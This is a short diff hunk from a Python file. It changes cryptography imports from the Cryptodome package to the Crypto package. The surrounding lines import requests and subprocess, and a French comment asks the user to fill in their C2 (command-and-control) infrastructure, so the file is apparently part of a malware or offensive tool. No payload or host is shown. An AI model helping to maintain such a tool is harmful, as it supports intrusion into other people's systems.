@@ -6,8 +6,8 @@ import shutil
 import requests
 import subprocess
 import time
-from Cryptodome.Cipher import AES
-from Cryptodome.Protocol.KDF import PBKDF2
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import PBKDF2
 
 # --- SURGICAL CONFIGURATION ---
 # Remplace avec ton infrastructure C2
